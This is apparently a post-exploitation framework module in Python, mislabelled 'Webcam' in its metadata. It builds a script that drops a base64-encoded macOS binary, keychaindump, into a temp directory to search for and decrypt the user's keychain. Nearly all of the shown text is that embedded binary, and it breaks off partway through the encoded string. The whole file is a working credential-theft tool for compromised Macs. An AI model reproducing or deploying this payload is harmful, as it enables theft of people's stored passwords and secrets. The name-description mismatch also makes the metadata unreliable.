from builtins import object
class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Webcam',

            # list of one or more authors for the module
            'Author': ['Juuso Salonen'],

            # more verbose multi-line description of the module
            'Description': ("Searches for keychain candidates and attempts to decrypt the user's keychain."),

            'Software': '',

            'Techniques': ['T1142'],

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://github.com/juuso/keychaindump"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'TempDir' : {
                'Description'   :   'Temporary directory to drop the keychaindump binary.',
                'Required'      :   True,
                'Value'         :   '/tmp/'
            },
            'KeyChain' : {
                'Description'   :   'Manual location of keychain to decrypt, otherwise default.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        keyChain = self.options['KeyChain']['Value']
        tempDir = self.options['TempDir']['Value']
        if not tempDir.endswith("/"):
            tempDir += "/"

        script = """
import base64
import os
keychaindump = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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ChBIiU3g6C38///pAAAAAOkAAAAAi0WYBQQAAACJRZjpT////+kbAAAASI09qBcAAIt1nEiLVcCwAOilFQAAiYV8////SIt9qOhgFQAASIs9oxoAAEiLP0g7ffgPhQkAAABIgcSQAAAAXcPoGhUAAA8fhAAAAAAAVUiJ5UiB7MACAABIjZVo/f//SIsFbxoAAEiLDWAaAABIiwlIiU34ib1s/f//iziLtWz9///oVhUAAL6AAAAAifEx0kyNBUAXAABIjb1w////RIuNbP3//0iJzomFTP3//7AA6J4UAABIjTUkFwAASI29cP///4mFSP3//+jlFAAASImFYP3//74AAgAASI29cP3//0iLlWD9///ohBQAAEg9AAAAAA+EdAAAAEiNNeIWAABIjZVY/f//SI2NUP3//0iNvXD9//+wAOipFAAAPQIAAAAPhUEAAABIjT3IFgAAi7Vs/f//SIuVWP3//0iLjVD9//+wAOhwFAAAi71o/f//SIu1WP3//0iLlVD9//+JhUT9///oJf3//+lo////SIu9YP3//+g0FAAASIs9TRkAAEiLP0g7ffiJhUD9//8PhQkAAABIgcTAAgAAXcPovhMAAGZmZi4PH4QAAAAAAFVIieVIg+wQSIl9+EiLffiLP+gJAAAASIPEEF3DDx8AVUiJ5Yl9/It9/A/Pifhdw1VIieVIg+xASIl98EiBPdEZAAAAAAAAD4U4AAAASMdF6AAAAwBIi33o6JYTAAAx9kjHwf////9IiQWqGQAASIsFoxkAAEiLVehIicfoHxMAAEiJRdDHReQAAAAAi0XkOwWLGQAAD41gAAAASIt98EhjReRIacBgAAAASAMFZxkAALkUAAAAicpIicboOhMAAD0AAAAAD4UbAAAASGNF5EhpwGAAAABIAwU7GQAASIlF+OmVAAAA6QAAAACLReQFAQAAAIlF5OmR////gT0bGQAAAAgAAA+NVQAAALgUAAAAicJIx8H/////iwUBGQAAicaBxgEAAACJNfMYAABIY/hIaf9gAAAASAM92hgAAEiJfdhIi33YSIt18OhLEgAASItN2EiJTfhIiUXI6RsAAABIjT0TFQAAsADonhIAAL8BAAAAiUXE6D0SAABIi0X4SIPEQF3DZmYuDx+EAAAAAABVSInlSIl98EiJdehIi3XoSIHuAQAAAEiLffCKBDeIRecPvk3ngfkBAAAAD4wPAAAAD75F5z0IAAAAD44NAAAASMdF+AAAAADpZgAAAMdF4AEAAACLReAPvk3nOcgPjUcAAABIi0XoSC0BAAAASGNN4EgpyEiLTfAPvhQBD7515znyD4QNAAAASMdF+AAAAADpHgAAAOkAAAAAi0XgBQEAAACJReDpqv///0gPvkXnSIlF+EiLRfhdww8fgAAAAABVSInlSIHsMAIAAEiNhTD///9MjU3wTIsVsxYAAE2LEkyJVfhIiX3QSIl1yEiJVcBIiU24TIlFsEiLTbBIiwlIiU3YSItNuEiLCUiJTfBIi024SItJCEiJTehIi024SItJEEiJTeBMic9Iicbo0xAAAEiNtbD+//9IjU3oSInPiYUU/v//6LoQAABIjbUw/v//SI1N4EiJz4mFEP7//+ihEAAASIt9yImFDP7//+jyEAAASI2NMP///0yNhbD+//9MjY0w/v//SI1V2EUx20iJhSj+//9Ii33QSIu1KP7//0iLRchIiZUA/v//SInCSIuFAP7//0iJBCTHRCQIAAAAAESJnfz9///oMRAAAEjHhSD+//8AAAAASIu9KP7//0iLdcjoGP7//0iJhRj+//9Igb0Y/v//AAAAAA+GNwAAAEjHwf////9Ii0XISCuFGP7//0iJhSD+//9Ii33ASIu1KP7//0iLlSD+///o2g8AAEiJhfD9//9Ii70o/v//6AMQAABIiz1GFQAASIuFIP7//0iLP0g7ffhIiYXo/f//D4UQAAAASIuF6P3//0iBxDACAABdw+ioDwAAZg8fRAAAVUiJ5UiB7LAAAABIiwX+FAAASIsASIlF+EiJfbBIiXWoSIlVoEiJTZhEiwVlEgAARIlFk0SKDV4SAABEiE2XSItFmEgtBAAAAEGJwESJRYyBfYwAAAAAD4xDAAAAuAQAAACJwkiNfZNIi02gSGN1jEgB8UiJzuiZDwAAPQAAAAAPhQUAAADpFQAAAOkAAAAAi0WMLQQAAACJRYzpsP///4F9jAAAAAAPhR4AAABIjT3mEQAAsADoQQ8AAL8BAAAAiYVs////6N0OAABIi0WgSGNNjEgByEiJRYBIi0WASItAQEiJRfBIi0WASAUIAAAASInH6Pj6//+6MAAAAInWTI1F8EiNVcCJhXz///9Ii02ASGO9fP///0gB+UiLfahIib1g////SInPSIuNYP///+gL/f//SImFcP///0iBvXD///8AAAAAD4UMAAAAx0W8AAAAAOkpAAAAuBgAAACJwkjHwf////9IjXXASIt9sOgWDgAAx0W8GAAAAEiJhVj///9IiwWHEwAAi028SIsASDtF+ImNVP///w+FDwAAAIuFVP///0iBxLAAAABdw+jvDQAAZmZmZi4PH4QAAAAAAFVIieVIgezgAAAASIsFPhMAAEiLAEiJRfhIib1o////SIm1YP///0iLhWD///9IBQgAAABIicfo9Pn//4mFXP///0iLtWD///9IgcYMAAAASIn36Nj5//9IjTWWEAAAuQQAAACJykiNfdCJhVj///9Mi4Vg////TYtAEEyJRfBMi4Vg////TGONWP///0+LVAgITIlV0E+LVAgQTIlV2EOLRAgYiUXg6KgNAAA9AAAAAA+EBQAAAOlYAQAAi4VY////K4Vc////iYVU////gb1U////MAAAAA+EBQAAAOkxAQAAuDAAAACJxkyNRZdIjVWgSIsNARAAAEiJTZdAij3+DwAAQIh9n0iLjWD///9MY41c////TAHJTIuNaP///0iJz0yJyehV+///SImFSP///8eFRP///wAAAACBvUT///8gAAAAD402AAAAuB8AAABIY41E////ilQNoCuFRP///0hjyIiUDXD///+LhUT///8FAQAAAImFRP///+m6////uCAAAACJxkyNRfBIjVWgSI29cP///0iLjWj////o3Pr//0iJhUj///9Igb1I////HAAAAA+EBQAAAOlTAAAASI190OiW+P//uRgAAACJykjHwf////9IjX2gSImFOP///0iLhTj///9IBRwAAABIgccEAAAASIm9MP///0iJx0iLtTD////ovQsAAEiJhSj///9IiwU1EQAASIsASDtF+A+FCQAAAEiBxOAAAABdw+isCwAAZi4PH4QAAAAAAFVIieVIgezQAAAASIsF/hAAAEiLAEiJRfhIiX3QSIt90OjK9///iUXMSIt90EiBxxAAAADot/f//4lFyItFzItNyIHBGAAAADnID4UFAAAA6QYDAABIi0XQSAUYAAAASInH6In3//+5BAAAACX+////iUXEi0XEK0XIiUXAi0XALRgAAACZ9/mJRbyBfbwUAAAAD4QFAAAA6b4CAABIi0XQSGNNwEgByEiJRbCLVciB6hQAAACB6ggAAABIY8JIiUWoSIF9qAgAAAAPgwUAAADphgIAAEiLRahIJQcAAABIPQAAAAAPhAUAAADpawIAAEiLfajo6woAAEjHwf////9IiUWgSItFsEiLOEiJfeBIi3gISIl96ItQEIlV8EiLRbBIi0AUSIlF2EiLfaBIi0WwSAUcAAAASItVqEiJxuhHCgAASI194EiJhWD////ozfb//0G4CAAAAESJwkjHwf////9IjXXYSIlFmEiLRZhIBRQAAABIicfoDQoAAEiLTaBIi1WYSIlKQEiLTahIi1WYSIlKOEiLTdBIgcEYAAAASIHBPAAAAEiJz0iJhVj////oOvb//yX+////iUWUSItN0EiBwRgAAABIgcE0AAAASInP6Bj2//8l/v///4lFkEiLTdBIY1WUSAHRSIlNiEiLTdBIY1WQSAHRSIlNgEiLfYjo6fX//4mFfP///0iLfYDo2vX//4mFeP///4G9fP///wAAAAAPhBAAAACBvXj///8AAAAAD4UFAAAA6RoBAACLhXz///8FAQAAAEhj+OiQCQAASImFcP///4uNeP///4HBAQAAAEhj+eh1CQAAMfZIx8H/////SImFaP///0iLvXD///+LlXz///+BwgEAAABIY9Lo9ggAADH2SMfB/////0iLvWj///9Ei4V4////QYHAAQAAAElj0EiJhVD////oyQgAAEjHwf////9Ii71w////SItViEiBwgQAAABMY418////SInWTInKSImFSP///+iRCAAASMfB/////0iLvWj///9Ii1WASIHCBAAAAEhjtXj///9IibVA////SInWSIuVQP///0iJhTj////oVAgAAEiLjXD///9Ii1WYSIlKSEiLjWj///9Ii1WYSIlKUEiJhTD///9IiwWuDQAASIsASDtF+A+FCQAAAEiBxNAAAABdw+glCAAADx8AVUiJ5UiD7HBIjQU0CwAAuQQAAACJykiJffhIiXXwSIt98EiJxuhqCAAAPQAAAAAPhBYAAABIjT0MCwAAsADoOQgAAIlFmOm1AQAASItF8EgFDAAAAEiJx+gT9P//iUXkSIt98EhjTeRIAc9IiX3YSItN2EiBwQQAAABIic/o7vP//4lF1MdF7AAAAACLRew7RdQPjWgBAABIi0XYSAUIAAAAi03sweECSGPRSAHQSInH6Lrz//+JRdBIi1XYSGN90EgB+kiJVchIi1XISIHCCAAAAEiJ1+iV8///iUXEx0XoAAAAAItF6DtFxA+N+gAAAEiLRchIBRwAAACLTejB4QJIY9FIAdBIicfoYfP//4lFwEiLVchIY33ASAH6SIlVuEiLfbjoRvP//4lFtEiLVbhIgcIQAAAASInX6DDz//+JRbDHRawYAAAAi0W0i02wgcEYAAAAOcgPjiMAAABIi0W4SAUYAAAASInH6ADz//8l/v///4lFqItFqCtFsIlFrEiLRbhIY02sSAHISIlFoEiLfaDo1/L//4lFnIF9nBEH3voPhRIAAABIi334SIt1oOiK+P//6RsAAACBfZxwZ3NzD4UJAAAASIt9uOiv+v//6QAAAADpAAAAAItF6AUBAAAAiUXo6fr+///pAAAAAItF7AUBAAAAiUXs6Yz+//9Ig8RwXcNmLg8fhAAAAAAAVUiJ5UiD7DBIgT1lDAAAAAAAAA+FBQAAAOkCAQAAx0X8AAAAAItF/DsFUgwAAA+N7AAAAEhjRfxIacBgAAAASAMFMgwAAEiJRfBIi0XwSIF4QAAAAAAPhQUAAADprwAAAEiLRfBIi3g46OYFAABIiUXoSItF8EiLeEBIi0XwSItwOEiLVehIi0XwSAUcAAAASItN8EiBwRQAAABIiU3YSInBTItF2OgF9P//SIlF4EiBfeAAAAAAD4RKAAAASItF4EgFAQAAAEiJx+iFBQAASMfB/////0iLffBIiUdYSItF4EiLffBIi39YxgQHAEiLRfBIi3hYSIt16EiLVeDo9wQAAEiJRdBIi33o6CYFAACLRfwFAQAAAIlF/OkF////SIPEMF3DZi4PH4QAAAAAAFVIieVIg+wgSIE9NQsAAAAAAAAPhQUAAADpsgAAAMdF/AAAAACLRfw7BSILAAAPjZwAAABIY0X8SGnAYAAAAEgDBQILAABIiUXwSItF8EiBeFAAAAAAD4UXAAAASItF8EiBeEgAAAAAD4UFAAAA6U0AAABIi0XwSIt4UEiNNbIHAADoxwQAAD0AAAAAD4UFAAAA6SkAAABIjT2qBwAASItF8EiLcFBIi0XwSItQSEiLRfBIi0hYsADofwQAAIlF7ItF/AUBAAAAiUX86VX///9Ig8QgXcNmLg8fhAAAAAAAVUiJ5UiB7DADAABIiwVeCQAASIsASIlF+MeFTP3//wAAAACJvUj9//9IibVA/f//6Jvr//+JhTz9//+BvTz9//8AAAAAD4UeAAAASI09IAcAALAA6AMEAAC/AQAAAImFFP3//+ifAwAAsADozgMAAD0AAAAAD4QeAAAASI09GgcAALAA6NMDAAC/AQAAAImFEP3//+hvAwAAi708/f//6Ezu//9IjT0fBwAAizXPCQAAsADopAMAAIE9vgkAAAAAAACJhQz9//8PhQoAAAC/AQAAAOgwAwAAgb1I/f//AgAAAA+NRgAAAEiNPSMHAABIjYXw/f//SImFAP3//+g2AwAAMfa5AAIAAInKSI0N3AYAAEiLvQD9//9JicCwAOjZAgAAiYX8/P//6S8AAAAx9rgAAgAAicJIjQ3ZBgAASI298P3//0yLhUD9//9Ni0AIsADopQIAAImF+Pz//0iNNbYGAABIjb3w/f//6KoCAABIiYUw/f//SIG9MP3//wAAAAAPhSUAAABIjT2OBgAASI218P3//7AA6L8CAAC/AQAAAImF9Pz//+hbAgAAMcCJxroCAAAASIu9MP3//+hqAgAASIu9MP3//4mF8Pz//+heAgAASImFKP3//0iLvSj9///oXQIAAEiJhSD9//9Ii70w/f//6GgCAAC6AQAAAInWSIu9IP3//0iLlSj9//9Ii40w/f//6AUCAABIi70w/f//SImF6Pz//+jgAQAASI09/wUAAEiNtfD9//+JheT8//+wAOgTAgAAx4UY/f//AAAAAMeFHP3//wAAAACJheD8//+LhRz9//87BREIAAAPjbgAAAC4GAAAAInCSI29kP3//0hjjRz9//9IizXnBwAASIs0zuiW5///SI09vQUAAEiNtZD9//+wAOitAQAASI290P3//0hjjRz9//9IixW0BwAASIs0ykiLlSD9//9Ii40o/f//iYXc/P//6H/x//+JhRj9//89AAAAAA+EIAAAAEiNPYoFAABIjbWQ/f//sADoVQEAAImF2Pz//+kbAAAA6QAAAACLhRz9//8FAQAAAImFHP3//+k2////gb0Y/f//AAAAAA+FHgAAAEiNPVkFAACwAOgRAQAAvwEAAACJhdT8///orQAAALgYAAAAicJIjbXQ/f//SI29UP3//+i75v//SI09VwUAAEiNtVD9//+wAOjSAAAASI290P3//0iLtSD9//+JhdD8///oPfj//+hI+v//6HP7//9Ii70g/f//6G0AAABIixWwBQAASIsSSDtV+A+FCwAAADHASIHEMAMAAF3D6CUAAACQ/yWcBQAA/yWeBQAA/yWgBQAA/yWiBQAA/yWkBQAA/yWmBQAA/yWoBQAA/yWqBQAA/yWsBQAA/yWuBQAA/yWwBQAA/yWyBQAA/yW0BQAA/yW2BQAA/yW4BQAA/yW6BQAA/yW8BQAA/yW+BQAA/yXABQAA/yXCBQAA/yXEBQAA/yXGBQAA/yXIBQAA/yXKBQAA/yXMBQAA/yXOBQAA/yXQBQAA/yXSBQAA/yXUBQAATI0d1QQAAEFT/yXFBAAAkGgAAAAA6eb///9oHAAAAOnc////aC8AAADp0v///2hDAAAA6cj///9oVwAAAOm+////aG0AAADptP///2iCAAAA6ar///9omgAAAOmg////aKYAAADplv///2i0AAAA6Yz///9owQAAAOmC////aM4AAADpeP///2jbAAAA6W7///9o6AAAAOlk////aPYAAADpWv///2gEAQAA6VD///9oEwEAAOlG////aCMBAADpPP///2gyAQAA6TL///9oQQEAAOko////aFABAADpHv///2heAQAA6RT///9obQEAAOkK////aHwBAADpAP///2iLAQAA6fb+//9omgEAAOns/v//aKoBAADp4v7//2i5AQAA6dj+//9ozgEAAO